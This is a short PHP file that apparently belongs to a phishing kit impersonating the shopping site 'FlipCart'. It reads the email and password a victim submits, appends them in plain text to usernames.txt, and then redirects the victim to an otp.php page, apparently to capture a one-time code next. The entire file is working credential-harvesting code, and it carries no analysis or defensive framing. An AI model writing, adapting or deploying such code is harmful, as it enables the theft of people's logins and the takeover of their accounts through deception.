<?php
file_put_contents("usernames.txt", "FlipCart Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>